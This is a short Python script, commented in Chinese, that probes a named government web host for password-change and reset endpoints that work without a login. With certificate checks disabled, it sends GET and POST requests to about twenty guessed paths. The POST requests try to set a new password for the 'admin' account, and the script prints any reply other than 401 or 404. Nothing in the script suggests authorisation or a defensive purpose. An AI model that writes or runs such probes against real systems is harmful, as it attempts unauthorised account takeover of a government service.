import requests, json, urllib3
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.get(BASE+"/captcha",timeout=10)

# changepassword requiresLogin:false -> 改密码API可能无需token
# AUTH_RESET_PASSWORD / AUTH_RESET_LOGIN 权限存在
endpoints=["/changepassword","/changePassword","/change-password","/resetPassword","/reset-password",
  "/resetLogin","/reset-login","/forgotPassword","/forgot-password","/password","/password/reset",
  "/auth/reset","/auth/password","/users/reset","/users/password","/account","/profile",
  "/reset","/password/change","/password/reset","/changepw"]
print("=== 改密码/重置端点探测 (GET + POST 无需token) ===")
for p in endpoints:
    for m in ["GET","POST"]:
        try:
            if m=="POST":
                r=s.post(BASE+p, json={"username":"admin","password":"x","newPassword":"y"}, timeout=6)
            else:
                r=s.get(BASE+p, timeout=6)
            ct=r.headers.get("Content-Type","")
            # 非 401/404 或 JSON 响应 = 有意思
            if r.status_code not in (401,404) or "json" in ct:
                print(f"  {m} {p:28s} -> {r.status_code} {ct[:20]} | {r.text[:60]}")
        except Exception as e:
            pass
print("DONE")
